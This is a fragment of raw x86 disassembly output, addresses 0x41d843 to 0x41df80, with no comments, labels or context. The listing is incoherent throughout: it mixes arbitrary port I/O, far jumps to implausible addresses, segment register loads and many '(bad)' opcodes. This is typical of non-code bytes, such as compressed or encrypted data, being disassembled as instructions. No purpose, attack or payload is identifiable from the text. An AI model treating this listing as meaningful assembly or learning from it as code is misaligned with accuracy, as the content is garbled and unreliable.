  41d843:	sbb    bh,al
  41d845:	pusha  
  41d846:	rol    edx,cl
  41d848:	shl    DWORD PTR [edi+eax*1+0x1d],1
  41d84c:	xchg   esi,eax
  41d84d:	xchg   BYTE PTR [esi-0x4d],bl
  41d850:	fsub   DWORD PTR [ecx-0x51f449c3]
  41d856:	add    ebp,DWORD PTR [edi-0x29]
  41d859:	into   
  41d85a:	sbb    eax,0xf92393d5
  41d85f:	pop    ecx
  41d860:	stos   BYTE PTR es:[edi],al
  41d861:	pop    ss
  41d862:	leave  
  41d863:	in     eax,0xf5
  41d865:	sahf   
  41d866:	adc    al,0x2e
  41d868:	nop
  41d869:	sbb    al,0x82
  41d86b:	sub    ch,al
  41d86d:	mov    al,ds:0x7090e71d
  41d872:	subps  xmm2,xmm0
  41d875:	xchg   edx,eax
  41d876:	fs enter 0x275d,0x72
  41d87b:	sahf   
  41d87c:	out    dx,al
  41d87d:	aam    0x83
  41d87f:	in     al,dx
  41d880:	sbb    bh,BYTE PTR [edi+0x40714bae]
  41d886:	jl     0x41d8da
  41d888:	jo     0x41d8c4
  41d88a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d88b:	cdq    
  41d88c:	mov    edi,0x242aa3e7
  41d891:	sbb    DWORD PTR [ebx],esp
  41d893:	sub    eax,eax
  41d895:	retf   
  41d896:	(bad)  
  41d897:	pop    edx
  41d898:	pop    edx
  41d899:	inc    edx
  41d89a:	test   eax,0x8889ccf5
  41d8a0:	outs   dx,BYTE PTR ds:[esi]
  41d8a1:	push   esp
  41d8a2:	and    BYTE PTR [edx-0x4a910d65],ch
  41d8a8:	dec    edi
  41d8a9:	scas   al,BYTE PTR es:[edi]
  41d8aa:	call   0x605dcc04
  41d8af:	mov    al,0x5d
  41d8b1:	dec    ebx
  41d8b2:	imul   ecx,DWORD PTR [ebx],0x25
  41d8b5:	xor    edx,DWORD PTR [esi]
  41d8b7:	dec    ebx
  41d8b8:	sbb    dh,BYTE PTR [edi+0x8cda5fb]
  41d8be:	inc    edx
  41d8bf:	inc    ecx
  41d8c0:	cmp    al,BYTE PTR [ecx-0x65]
  41d8c3:	inc    esi
  41d8c4:	cmc    
  41d8c5:	shl    BYTE PTR [eax-0xa1a357c],cl
  41d8cb:	cmp    al,0xc9
  41d8cd:	mov    BYTE PTR [eax+edi*1],ch
  41d8d0:	loope  0x41d8a2
  41d8d2:	imul   ebp,DWORD PTR [edx+ebx*1+0x9],0x76
  41d8d7:	sub    al,BYTE PTR [ebx-0x1addf391]
  41d8dd:	xchg   edx,eax
  41d8de:	push   ax
  41d8e0:	jno    0x41d938
  41d8e2:	cmp    DWORD PTR [edi-0x74751e32],edi
  41d8e8:	push   ds
  41d8e9:	mov    esp,esp
  41d8eb:	cmc    
  41d8ec:	jmp    0xb8e2:0x5f42458b
  41d8f3:	cld    
  41d8f4:	jmp    0x4f81:0xa1a84adf
  41d8fb:	and    al,0x2e
  41d8fd:	xchg   edi,eax
  41d8fe:	(bad)  
  41d8ff:	iret   
  41d900:	push   esi
  41d901:	xchg   edx,eax
  41d902:	loope  0x41d902
  41d904:	cmp    al,0x27
  41d906:	pop    ecx
  41d907:	jo     0x41d952
  41d909:	inc    edi
  41d90a:	repz mov bh,0x2a
  41d90d:	jl     0x41d8ec
  41d90f:	jae    0x41d97f
  41d911:	stos   DWORD PTR es:[edi],eax
  41d912:	and    DWORD PTR [ebp+ebp*2-0x16],eax
  41d916:	jbe    0x41d8f4
  41d918:	xchg   DWORD PTR [ecx+edi*1+0x52],esp
  41d91c:	dec    ecx
  41d91d:	and    eax,0x80fea457
  41d922:	push   ebx
  41d923:	out    dx,al
  41d924:	daa    
  41d925:	imul   edx,esp,0x8a9c8f66
  41d92b:	or     eax,0x28987a7a
  41d930:	out    0x45,eax
  41d932:	std    
  41d933:	pop    ebx
  41d934:	jl     0x41d8bc
  41d936:	xchg   edx,eax
  41d937:	mov    ds:0xd36fcc37,eax
  41d93c:	add    ebx,ebp
  41d93e:	adc    eax,0xdb09b203
  41d943:	pop    eax
  41d944:	cdq    
  41d945:	and    al,0x41
  41d947:	aad    0x22
  41d949:	mov    al,ds:0x5aa77002
  41d94e:	and    al,0x3c
  41d950:	addr16 dec esi
  41d952:	sahf   
  41d953:	and    ecx,DWORD PTR [esi]
  41d955:	fmul   QWORD PTR [edi+0x57]
  41d958:	(bad)  
  41d959:	jnp    0x41d8fa
  41d95b:	mov    al,0xd0
  41d95d:	xor    ebx,0xffffff96
  41d960:	mov    ss,WORD PTR [esi+0x43]
  41d963:	and    dl,ch
  41d965:	dec    eax
  41d966:	lea    edx,[ecx-0x47]
  41d969:	and    cl,BYTE PTR [edx+0x2a]
  41d96c:	fsubr  QWORD PTR [eax]
  41d96e:	lea    esp,[ebx]
  41d970:	jns    0x41d922
  41d972:	mov    ds:0x1bce7c1e,al
  41d977:	retf   0x8d58
  41d97a:	repnz cmp esi,0x53
  41d97e:	shl    DWORD PTR [eax+0x48ec92e],1
  41d984:	or     al,0xf0
  41d986:	inc    eax
  41d987:	inc    sp
  41d989:	lods   al,BYTE PTR ds:[esi]
  41d98a:	cli    
  41d98b:	inc    ebp
  41d98c:	jb     0x41d9f8
  41d98e:	ins    BYTE PTR es:[edi],dx
  41d98f:	xchg   esp,eax
  41d990:	call   0xe104ac9a
  41d995:	sbb    dl,BYTE PTR [ebx]
  41d997:	leave  
  41d998:	dec    ebx
  41d999:	jle    0x41d9be
  41d99b:	mov    bh,0x6a
  41d99d:	test   DWORD PTR [edi],ecx
  41d99f:	hlt    
  41d9a0:	jno    0x41d99e
  41d9a2:	add    eax,0x6bab205f
  41d9a7:	popf   
  41d9a8:	repnz mov ecx,DWORD PTR [edx-0x396e0bf1]
  41d9af:	mov    ch,0xa2
  41d9b1:	retf   
  41d9b2:	mov    ebp,0xe7c40e87
  41d9b7:	cdq    
  41d9b8:	into   
  41d9b9:	xchg   BYTE PTR [edx+0x19],ch
  41d9bc:	mov    es,ebx
  41d9be:	jge    0x41da32
  41d9c0:	fbld   TBYTE PTR [ecx+0x6]
  41d9c3:	inc    edx
  41d9c4:	cmp    dh,BYTE PTR [eax+esi*2]
  41d9c7:	aad    0x21
  41d9c9:	jne    0x41da4a
  41d9cb:	out    dx,al
  41d9cc:	or     DWORD PTR [edx+0x7b8f68e1],ebp
  41d9d2:	sbb    ebx,DWORD PTR [esi-0x15e42c3b]
  41d9d8:	dec    esp
  41d9d9:	cmp    BYTE PTR [eax-0x4fd0be44],0x3c
  41d9e0:	xchg   ebx,eax
  41d9e1:	inc    ecx
  41d9e2:	fadd   DWORD PTR [edi-0xe3d5325]
  41d9e8:	pop    esi
  41d9e9:	bound  ebx,QWORD PTR [ebx]
  41d9eb:	dec    ebp
  41d9ec:	rcr    DWORD PTR [ebx],0xba
  41d9ef:	int    0x77
  41d9f1:	neg    DWORD PTR [edi+0x76]
  41d9f4:	int    0x5f
  41d9f6:	jns    0x41da65
  41d9f8:	mul    DWORD PTR [eax+0x78]
  41d9fb:	(bad)  
  41d9fd:	mov    ds:0x26bdf131,eax
  41da02:	iret   
  41da03:	add    edx,DWORD PTR [ecx]
  41da05:	push   esi
  41da06:	pop    ds
  41da07:	dec    esp
  41da08:	(bad)  
  41da09:	xchg   edx,eax
  41da0a:	in     al,0xa4
  41da0c:	or     eax,0xf5360fc9
  41da11:	call   0xda03:0x10cf4c3d
  41da18:	mov    dl,0x85
  41da1a:	jb     0x41da20
  41da1c:	pop    ebx
  41da1d:	enter  0x3868,0x87
  41da21:	(bad)  
  41da22:	jbe    0x41da56
  41da24:	pop    eax
  41da25:	adc    esi,DWORD PTR [ebx]
  41da27:	stc    
  41da28:	push   es
  41da29:	(bad)  
  41da2a:	fild   QWORD PTR [ecx-0x39]
  41da2d:	imul   esp,DWORD PTR [esi],0xe9e986f0
  41da33:	ja     0x41d9ef
  41da35:	jg     0x41d9f9
  41da37:	cmp    esp,ebp
  41da39:	jl     0x41daa9
  41da3b:	lock mov dl,0x46
  41da3e:	and    BYTE PTR [esi-0x60214c34],ch
  41da44:	pop    ebx
  41da45:	xchg   DWORD PTR [ebx],ebx
  41da47:	aas    
  41da48:	xchg   edx,eax
  41da49:	or     DWORD PTR [edx+ecx*8],ecx
  41da4c:	js     0x41da3f
  41da4e:	repnz sub eax,ebx
  41da51:	jb     0x41da54
  41da53:	out    0x7c,eax
  41da55:	pop    edx
  41da56:	popf   
  41da57:	push   es
  41da58:	sbb    eax,0xfee1bd7d
  41da5d:	mov    al,BYTE PTR [ecx+0x5]
  41da60:	add    esi,DWORD PTR [esi]
  41da62:	xchg   ebp,eax
  41da63:	inc    esp
  41da64:	repnz adc BYTE PTR [eax*8+0x2c5856d6],bh
  41da6c:	(bad)  
  41da6d:	out    dx,al
  41da6e:	push   ebp
  41da6f:	dec    ebx
  41da70:	std    
  41da71:	or     ebx,ebp
  41da73:	lea    esi,[ebx]
  41da75:	jg     0x41da30
  41da77:	ds cmp al,0x70
  41da7a:	in     eax,0xe7
  41da7c:	mov    al,0x65
  41da7e:	push   ecx
  41da7f:	dec    edx
  41da80:	mov    esi,0x7a8cb7d6
  41da85:	mov    bh,0x7f
  41da87:	or     DWORD PTR [edx-0x80],esi
  41da8a:	xor    DWORD PTR [esi],ecx
  41da8c:	inc    ebp
  41da8d:	test   eax,0x53ba003a
  41da92:	xchg   esp,eax
  41da93:	in     al,dx
  41da94:	imul   edi,DWORD PTR [edi-0x65f90599],0x681b5926
  41da9e:	sbb    ah,BYTE PTR [eax+0x589d652e]
  41daa4:	dec    edx
  41daa5:	outs   dx,DWORD PTR ds:[esi]
  41daa6:	mov    BYTE PTR [ecx+0x57],dh
  41daa9:	cli    
  41daaa:	das    
  41daab:	mov    bh,0xb2
  41daad:	loop   0x41dab3
  41daaf:	and    esi,DWORD PTR [eax+0x45f165e5]
  41dab5:	push   esi
  41dab6:	mov    dl,0x1
  41dab8:	dec    esp
  41dab9:	(bad)  
  41dabb:	add    BYTE PTR gs:[edx-0x1cc81521],dh
  41dac2:	adc    bl,BYTE PTR [eax+ebp*2]
  41dac5:	sbb    dh,BYTE PTR [edx+0x72a102a7]
  41dacb:	les    esi,FWORD PTR [eax+ecx*1]
  41dace:	dec    eax
  41dacf:	xor    eax,0xa554204b
  41dad4:	loopne 0x41da6f
  41dad6:	loopne 0x41da79
  41dad8:	int3   
  41dad9:	sub    DWORD PTR [eax+eax*1+0x1ca9aef8],edx
  41dae0:	arpl   bp,cx
  41dae2:	popf   
  41dae3:	and    DWORD PTR [edi+0x5216cdc],esp
  41dae9:	pop    ss
  41daea:	adc    BYTE PTR [edi],bh
  41daec:	out    dx,al
  41daed:	and    ebp,ecx
  41daef:	js     0x41da79
  41daf1:	xchg   ecx,eax
  41daf2:	int    0xf8
  41daf4:	(bad)  
  41daf5:	cs inc edx
  41daf7:	inc    ebx
  41daf8:	rcl    DWORD PTR [esi-0x15],1
  41dafb:	inc    edi
  41dafc:	pop    ebx
  41dafd:	call   0x7e0f9fd3
  41db02:	adc    ah,BYTE PTR [ecx]
  41db04:	sub    ebx,edx
  41db06:	inc    edi
  41db07:	pushf  
  41db08:	inc    esp
  41db09:	std    
  41db0a:	inc    ecx
  41db0b:	xor    DWORD PTR [eax+0x7274da2e],ecx
  41db11:	test   al,0xfc
  41db13:	push   edi
  41db14:	loop   0x41db16
  41db16:	aaa    
  41db17:	inc    ebp
  41db18:	pushf  
  41db19:	mov    eax,0xda9bc05e
  41db1e:	jno    0x41daa2
  41db20:	ins    DWORD PTR es:[edi],dx
  41db21:	scas   eax,DWORD PTR es:[edi]
  41db22:	aam    0xae
  41db24:	aam    0x2d
  41db26:	mov    bh,0x12
  41db28:	outs   dx,BYTE PTR ds:[esi]
  41db29:	add    al,0xa
  41db2b:	sti    
  41db2c:	push   ebx
  41db2d:	scas   eax,DWORD PTR es:[edi]
  41db2e:	mov    bh,0x79
  41db30:	das    
  41db31:	sbb    al,0x3d
  41db33:	je     0x41db56
  41db35:	inc    eax
  41db36:	jno    0x41dbb5
  41db38:	cld    
  41db39:	sbb    dl,BYTE PTR [esi]
  41db3b:	fiadd  WORD PTR [ebp+0x1ff4ca13]
  41db41:	push   edx
  41db42:	sbb    ebp,DWORD PTR [esi]
  41db44:	mov    eax,0xa1b2b683
  41db49:	cdq    
  41db4a:	inc    ebp
  41db4b:	inc    ebp
  41db4c:	lahf   
  41db4d:	adc    al,0x18
  41db4f:	add    DWORD PTR [bp+si+0x5cb1],0xe1028514
  41db58:	xchg   esi,eax
  41db59:	push   ss
  41db5a:	stos   DWORD PTR es:[edi],eax
  41db5b:	pop    ebp
  41db5c:	xor    DWORD PTR [edi+0x27896fe8],edi
  41db62:	inc    ebx
  41db63:	outs   dx,BYTE PTR ds:[esi]
  41db64:	push   edi
  41db65:	ins    BYTE PTR es:[edi],dx
  41db66:	xchg   DWORD PTR [edi-0x7c7dc4d4],esi
  41db6c:	add    al,0xb1
  41db6e:	mov    bl,0x22
  41db70:	xchg   ecx,eax
  41db71:	rcr    DWORD PTR [eax-0x1d],0x9f
  41db75:	jo     0xe406192c
  41db7b:	jg     0x41dbb0
  41db7d:	push   edi
  41db7e:	or     DWORD PTR [ebx],ebx
  41db80:	mov    ecx,es
  41db82:	icebp  
  41db83:	mov    ds:0x666c40de,al
  41db88:	in     eax,0x9a
  41db8a:	loop   0x41db85
  41db8c:	mov    ah,0xcf
  41db8e:	test   eax,0x8b2d8394
  41db93:	inc    esi
  41db94:	cmp    eax,ebp
  41db96:	sbb    al,0xa8
  41db98:	xchg   esi,eax
  41db99:	lea    eax,[edi+0x52]
  41db9c:	mov    BYTE PTR [edx+edi*4-0x1a],bl
  41dba0:	leave  
  41dba1:	push   edi
  41dba2:	nop
  41dba3:	hlt    
  41dba4:	pop    ecx
  41dba5:	mov    eax,ds:0x96793900
  41dbaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbab:	call   0xcfae14fb
  41dbb0:	inc    ebx
  41dbb1:	or     ebp,edi
  41dbb3:	jb     0x41dbc1
  41dbb5:	jge    0x41dbcd
  41dbb7:	push   eax
  41dbb8:	es cli 
  41dbba:	data16 or WORD PTR [ebx-0x8],sp
  41dbbf:	(bad)  
  41dbc1:	pushf  
  41dbc2:	sub    BYTE PTR [edx-0x55a8a0a2],dh
  41dbc8:	or     esp,DWORD PTR [edi+0x6673c202]
  41dbce:	dec    edi
  41dbcf:	pop    edi
  41dbd0:	mov    esi,0x9d1bdc13
  41dbd5:	mov    eax,0x7d396a2d
  41dbda:	xlat   BYTE PTR ds:[ebx]
  41dbdb:	sub    BYTE PTR [ebx-0x76],bh
  41dbde:	and    bl,BYTE PTR [di]
  41dbe1:	jl     0x41dbb7
  41dbe3:	leave  
  41dbe4:	inc    ecx
  41dbe5:	frstor cs:[edi]
  41dbe8:	mov    bh,0x8e
  41dbea:	lock rol BYTE PTR [eax],0x52
  41dbee:	jns    0x41dbc8
  41dbf0:	aam    0x53
  41dbf2:	lods   al,BYTE PTR ds:[esi]
  41dbf3:	jl     0x41dbb6
  41dbf5:	sti    
  41dbf6:	pop    ds
  41dbf7:	inc    edx
  41dbf8:	pop    ds
  41dbf9:	shl    BYTE PTR [esi+ecx*1+0x67283bd3],cl
  41dc00:	sub    al,0x75
  41dc02:	pop    ebp
  41dc03:	pop    es
  41dc04:	xor    BYTE PTR [edi],cl
  41dc06:	sbb    eax,0xbfccaed9
  41dc0b:	enter  0x2cad,0x4
  41dc0f:	jle    0x41dc4b
  41dc11:	repnz outs dx,DWORD PTR ds:[esi]
  41dc13:	loopne 0x41dba1
  41dc15:	xchg   esp,eax
  41dc16:	(bad)  
  41dc17:	xlat   BYTE PTR ds:[ebx]
  41dc18:	retf   
  41dc19:	jae    0x41dbcd
  41dc1b:	cmp    dh,ah
  41dc1d:	clc    
  41dc1e:	mov    eax,0x206085e3
  41dc23:	mov    edi,0x49101afb
  41dc28:	jmp    0x41dc90
  41dc2a:	pop    esp
  41dc2b:	scas   al,BYTE PTR es:[edi]
  41dc2c:	inc    ebx
  41dc2d:	inc    edx
  41dc2e:	xor    al,0xc0
  41dc30:	(bad)  
  41dc31:	gs hlt 
  41dc33:	xlat   BYTE PTR ds:[ebx]
  41dc34:	pop    ecx
  41dc35:	inc    ebx
  41dc36:	(bad)  
  41dc37:	jae    0x41dbc5
  41dc39:	je     0x41dbf4
  41dc3b:	aaa    
  41dc3c:	cmp    eax,0xee5d60fe
  41dc41:	xchg   BYTE PTR [ebx-0x6f34b091],bh
  41dc47:	shl    DWORD PTR [ebp+0x1662529],0xff
  41dc4e:	and    eax,0xc77a9a04
  41dc53:	cmp    al,0xff
  41dc55:	int    0x3e
  41dc57:	xor    eax,0xef16e6d3
  41dc5c:	retf   0x2d15
  41dc5f:	jmp    0x41dc4b
  41dc61:	cwde   
  41dc62:	mov    ebx,0x3948b33a
  41dc67:	sbb    ebp,DWORD PTR [eax]
  41dc69:	daa    
  41dc6a:	cmp    edi,eax
  41dc6c:	pusha  
  41dc6d:	inc    eax
  41dc6e:	inc    ecx
  41dc6f:	jle    0x41dc08
  41dc71:	ret    0x784b
  41dc74:	and    al,0xd1
  41dc76:	dec    ebx
  41dc77:	xchg   DWORD PTR [esi+0xf],eax
  41dc7a:	sub    BYTE PTR [edi+0x3ccaebca],cl
  41dc80:	dec    ebx
  41dc81:	jbe    0x41dce5
  41dc83:	fisttp WORD PTR [eax+0x8]
  41dc86:	adc    DWORD PTR [edi],ebp
  41dc88:	sub    al,0x7e
  41dc8a:	inc    ecx
  41dc8b:	mov    ecx,0x12ec91a0
  41dc90:	inc    edx
  41dc91:	inc    edx
  41dc92:	aas    
  41dc93:	out    dx,eax
  41dc94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc95:	jl     0x41dcf7
  41dc97:	adc    BYTE PTR [edx+eiz*4-0x7b],dh
  41dc9b:	adc    dl,BYTE PTR [edx+eiz*1]
  41dc9e:	pop    esi
  41dc9f:	xor    al,0xa9
  41dca1:	cmp    di,sp
  41dca4:	fstp   QWORD PTR [eax+0x2e]
  41dca7:	fcmovne st,st(0)
  41dca9:	aas    
  41dcaa:	jmp    0x41dc86
  41dcac:	inc    ebx
  41dcad:	sub    DWORD PTR [edi+0x2f2c8a3a],ebp
  41dcb3:	sbb    ah,ch
  41dcb5:	jae    0x41dc56
  41dcb7:	inc    edi
  41dcb8:	jle    0x41dce8
  41dcba:	add    ebx,DWORD PTR [esi]
  41dcbc:	xor    dl,BYTE PTR [eax+0x64]
  41dcbf:	pop    ss
  41dcc0:	jge    0x41dd34
  41dcc2:	fs xor dh,ah
  41dcc5:	jl     0x41dc54
  41dcc7:	add    al,BYTE PTR [edx-0x5c]
  41dcca:	icebp  
  41dccb:	inc    esi
  41dccc:	jp     0x41dd3a
  41dcce:	leave  
  41dccf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dcd0:	pop    ecx
  41dcd1:	shl    DWORD PTR [esi+edx*8-0x202b8cc8],1
  41dcd8:	and    dh,BYTE PTR [ecx-0x72ea3547]
  41dcde:	pop    ds
  41dcdf:	inc    ebx
  41dce0:	push   ebp
  41dce1:	adc    esi,DWORD PTR [ebx-0x623f3c5e]
  41dce7:	push   ebp
  41dce8:	into   
  41dce9:	aas    
  41dcea:	add    ah,BYTE PTR [eax]
  41dcec:	arpl   WORD PTR [esi+0x50ddfbb2],bp
  41dcf2:	sub    DWORD PTR [eax],eax
  41dcf4:	cwde   
  41dcf5:	or     dl,BYTE PTR [edx+0x5e]
  41dcf8:	mov    edx,DWORD PTR [esi+0x33]
  41dcfb:	ja     0x41dd3d
  41dcfd:	ror    DWORD PTR [ecx],0x62
  41dd00:	cmp    BYTE PTR [ecx],dh
  41dd02:	lds    ebx,FWORD PTR [esp+ebp*8-0x2b]
  41dd06:	jnp    0x41dcd8
  41dd08:	cmc    
  41dd09:	mov    esp,0x6b5da004
  41dd0e:	sbb    al,0xbb
  41dd10:	int    0x5f
  41dd12:	lahf   
  41dd13:	sub    edi,ebp
  41dd15:	les    ebx,FWORD PTR [eax+edi*8+0x4ec042ca]
  41dd1c:	mov    ecx,0x8734925a
  41dd21:	push   ebx
  41dd22:	xchg   esp,eax
  41dd23:	inc    ecx
  41dd24:	out    0xbf,eax
  41dd26:	mov    bh,0x36
  41dd28:	retf   0xedc9
  41dd2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd2c:	push   es
  41dd2d:	mov    DWORD PTR [ebx-0x6ec418d8],edx
  41dd33:	inc    ecx
  41dd34:	sbb    eax,0x25b774f6
  41dd39:	aas    
  41dd3a:	(bad)  
  41dd3b:	cmp    al,0xd4
  41dd3d:	ror    BYTE PTR [ecx-0x50],1
  41dd40:	push   eax
  41dd41:	add    ebp,DWORD PTR [esi+0x1daebc0]
  41dd47:	icebp  
  41dd48:	gs mov cl,0x37
  41dd4b:	outs   dx,DWORD PTR ds:[esi]
  41dd4c:	inc    ecx
  41dd4d:	cmp    esp,DWORD PTR [edx+eax*4+0x1a14e1af]
  41dd54:	jnp    0x41dd71
  41dd56:	adc    eax,DWORD PTR [edi+0x294291ab]
  41dd5c:	dec    ebp
  41dd5d:	sbb    al,0x34
  41dd5f:	(bad)  
  41dd61:	push   ebx
  41dd62:	in     eax,0x46
  41dd64:	(bad)  
  41dd65:	cli    
  41dd66:	jmp    0x41dd83
  41dd68:	xchg   DWORD PTR [eax],edx
  41dd6a:	das    
  41dd6b:	push   es
  41dd6c:	sub    DWORD PTR [edx-0x22e108d5],eax
  41dd72:	or     edi,esp
  41dd74:	mov    ?,esp
  41dd76:	rol    edx,0xe1
  41dd79:	push   ebx
  41dd7a:	bnd jp 0x41dd41
  41dd7d:	mov    eax,0xb2dcae64
  41dd82:	xchg   esp,eax
  41dd84:	mov    al,bh
  41dd86:	inc    edx
  41dd87:	mov    eax,ds:0xaa700364
  41dd8c:	sub    cl,BYTE PTR [edx-0x437ce83f]
  41dd92:	dec    esi
  41dd93:	lods   eax,DWORD PTR ds:[esi]
  41dd94:	fdivp  st(2),st
  41dd96:	lds    edx,FWORD PTR ds:0x82fab8a7
  41dd9c:	ret    
  41dd9d:	rol    esp,0xb1
  41dda0:	inc    edi
  41dda1:	iret   
  41dda2:	xor    al,0x4e
  41dda4:	hlt    
  41dda5:	xor    al,0xc3
  41dda7:	das    
  41dda8:	adc    BYTE PTR [ebp+0xd],bh
  41ddab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ddac:	push   ds
  41ddad:	inc    ebx
  41ddae:	jne    0x41ddca
  41ddb0:	pop    edx
  41ddb1:	mov    dh,0x61
  41ddb3:	pop    ebx
  41ddb4:	adc    bl,BYTE PTR [esp+esi*8]
  41ddb7:	sbb    cl,BYTE PTR [edx+ebp*2]
  41ddba:	outs   dx,BYTE PTR ds:[esi]
  41ddbb:	pop    ebp
  41ddbc:	shr    DWORD PTR [esi+0x6bbdbdd4],1
  41ddc2:	pop    eax
  41ddc3:	dec    esi
  41ddc4:	lods   al,BYTE PTR ds:[esi]
  41ddc5:	out    dx,al
  41ddc6:	mov    eax,0xcbc4e686
  41ddcb:	sbb    BYTE PTR [esi-0x1402e666],dh
  41ddd1:	fldcw  WORD PTR [ebp+0x162d224e]
  41ddd7:	pop    edx
  41ddd8:	or     BYTE PTR [edx],ch
  41ddda:	mov    esp,ecx
  41dddc:	inc    eax
  41dddd:	mov    al,0x1e
  41dddf:	xchg   DWORD PTR [eax],edx
  41dde1:	adc    bl,BYTE PTR [ecx-0x7e272946]
  41dde7:	jecxz  0x41de60
  41dde9:	imul   eax,DWORD PTR [ebx-0x79],0x51b5c0e6
  41ddf0:	adc    BYTE PTR [esi],0xc
  41ddf3:	mov    ch,0xed
  41ddf5:	enter  0xd65c,0x9d
  41ddf9:	jmp    ebx
  41ddfb:	aad    0xf9
  41ddfd:	retf   0xb5bf
  41de00:	or     ah,BYTE PTR [eax+0x18]
  41de03:	or     al,0x7f
  41de05:	push   edx
  41de06:	adc    eax,0x661500dd
  41de0b:	mov    ecx,0xe06f0bd7
  41de10:	fadd   QWORD PTR [edi]
  41de12:	addr16 add ebp,esi
  41de15:	scas   al,BYTE PTR es:[edi]
  41de16:	stos   BYTE PTR es:[edi],al
  41de17:	repz in eax,0xb5
  41de1a:	add    edx,DWORD PTR [edx+0x3958d7ad]
  41de20:	xor    eax,0x8fceec76
  41de25:	dec    edi
  41de26:	lahf   
  41de27:	sbb    BYTE PTR ds:0x48d52b3d,dh
  41de2d:	arpl   bp,bx
  41de2f:	mov    esp,0x40d84c63
  41de34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de35:	adc    eax,0xb90badbe
  41de3a:	pusha  
  41de3b:	nop
  41de3c:	hlt    
  41de3d:	dec    ecx
  41de3e:	(bad)  
  41de3f:	(bad)  
  41de40:	es push edx
  41de42:	imul   eax,DWORD PTR [edi-0x39],0x41
  41de46:	je     0x41de8f
  41de48:	outs   dx,BYTE PTR ds:[esi]
  41de49:	pop    eax
  41de4a:	js     0x41de32
  41de4c:	cwde   
  41de4d:	pop    ds
  41de4e:	xchg   ecx,eax
  41de4f:	mov    bl,0x9
  41de51:	adc    BYTE PTR [esi+ebx*8-0x61899b5d],ah
  41de58:	xchg   DWORD PTR [edx],ebx
  41de5a:	and    ebp,DWORD PTR [ecx+0x5e]
  41de5d:	loopne 0x41ddea
  41de5f:	shr    DWORD PTR gs:[edx+eax*2],cl
  41de63:	xor    DWORD PTR [edx-0x5b09d011],ebx
  41de69:	js     0x41dea5
  41de6b:	xor    esp,DWORD PTR [eax+0x3e30026e]
  41de71:	sti    
  41de72:	fidivr WORD PTR [eax]
  41de74:	inc    edx
  41de75:	xchg   edi,eax
  41de76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de77:	add    ebx,0x6f
  41de7a:	and    BYTE PTR [edx-0x3b],bl
  41de7d:	jp     0x41de98
  41de7f:	push   0x62
  41de81:	lea    edi,[edx+0x12]
  41de84:	loop   0x41de29
  41de86:	add    eax,DWORD PTR [edx+ebx*1]
  41de89:	or     DWORD PTR [edx+0xd95daa4],eax
  41de8f:	mov    ebp,0x506eb0cf
  41de94:	push   es
  41de95:	add    al,BYTE PTR [ebp+0xe]
  41de98:	ret    
  41de99:	mov    ebx,0xa907379c
  41de9e:	add    BYTE PTR ds:0x54fbca8a,bl
  41dea4:	iret   
  41dea5:	lock mov eax,ds:0x72a11edc
  41deab:	mov    esp,0x978bd9e9
  41deb0:	out    0x95,eax
  41deb2:	sahf   
  41deb3:	xchg   edx,eax
  41deb4:	jno    0x41df2b
  41deb6:	jge    0x41dea9
  41deb8:	scas   eax,DWORD PTR es:[edi]
  41deb9:	frstor [ebx]
  41debb:	outs   dx,BYTE PTR ds:[esi]
  41debc:	out    dx,al
  41debd:	xor    bh,dh
  41debf:	jbe    0x41df39
  41dec1:	out    0x1,eax
  41dec3:	mov    al,0xae
  41dec5:	call   0x159b549c
  41deca:	adc    DWORD PTR [edi-0x18e7f289],ecx
  41ded0:	fcomip st,st(1)
  41ded2:	sub    al,0xbf
  41ded4:	sahf   
  41ded5:	mov    ebx,0x72d6d205
  41deda:	jp     0x41de61
  41dedc:	xlat   BYTE PTR ds:[ebx]
  41dedd:	sbb    al,0x8f
  41dedf:	sub    al,0x5b
  41dee1:	repz push eax
  41dee3:	add    ebx,DWORD PTR [esi+0x1f]
  41dee6:	xchg   esi,ecx
  41dee8:	dec    esp
  41dee9:	xchg   esp,esp
  41deeb:	clc    
  41deec:	dec    edx
  41deed:	es aas 
  41deef:	jle    0x41df1b
  41def1:	icebp  
  41def2:	mov    dh,0x73
  41def4:	je     0x41df3a
  41def6:	loope  0x41df2a
  41def8:	pop    edi
  41def9:	pop    ecx
  41defa:	shl    BYTE PTR [ebx-0xc967267],1
  41df00:	and    BYTE PTR [edx],al
  41df02:	test   BYTE PTR [edx+0x7d],ah
  41df05:	pop    ebp
  41df06:	inc    esi
  41df07:	mov    dl,BYTE PTR [edi+0x44]
  41df0a:	jp     0x41de9e
  41df0c:	cwde   
  41df0d:	stc    
  41df0e:	loop   0x41df57
  41df10:	xchg   ebp,eax
  41df11:	out    0x7c,al
  41df13:	(bad)  
  41df14:	sub    eax,DWORD PTR [ecx+edx*1+0x7a5fc295]
  41df1b:	fnstcw WORD PTR [ebx-0x7569b50d]
  41df21:	or     al,0xf3
  41df23:	push   ss
  41df24:	mov    bh,0x87
  41df26:	int3   
  41df27:	adc    edx,esi
  41df29:	pop    ebx
  41df2a:	out    0xe,eax
  41df2c:	ficom  WORD PTR [ecx-0x1cce5f90]
  41df32:	fdivr  DWORD PTR [eax]
  41df34:	mov    edi,0x1d7a6ca6
  41df39:	test   eax,0x25823818
  41df3e:	add    eax,0x500136ab
  41df43:	ret    
  41df44:	push   eax
  41df45:	mov    ah,0x18
  41df47:	retf   
  41df48:	popa   
  41df49:	push   esp
  41df4a:	xor    BYTE PTR [ebp-0xd],bh
  41df4d:	shr    DWORD PTR [ebx-0x6d1ae186],cl
  41df53:	ins    BYTE PTR es:[edi],dx
  41df54:	addr16 push 0x4ea449b5
  41df5a:	xchg   BYTE PTR [eax+0x7bac3e4],cl
  41df60:	ins    BYTE PTR es:[edi],dx
  41df61:	or     dh,ch
  41df63:	xor    DWORD PTR [ebx+0x5e99385b],ecx
  41df69:	pushf  
  41df6a:	dec    ebp
  41df6b:	rcl    DWORD PTR ds:0xd29403b,0x7f
  41df72:	test   eax,0x36c6620f
  41df77:	dec    ecx
  41df78:	inc    eax
  41df79:	xchg   edx,eax
  41df7a:	pop    edi
  41df7b:	ja     0x41df41
  41df7d:	xchg   esi,eax
  41df7e:	and    esp,edx
  41df80:	fwait
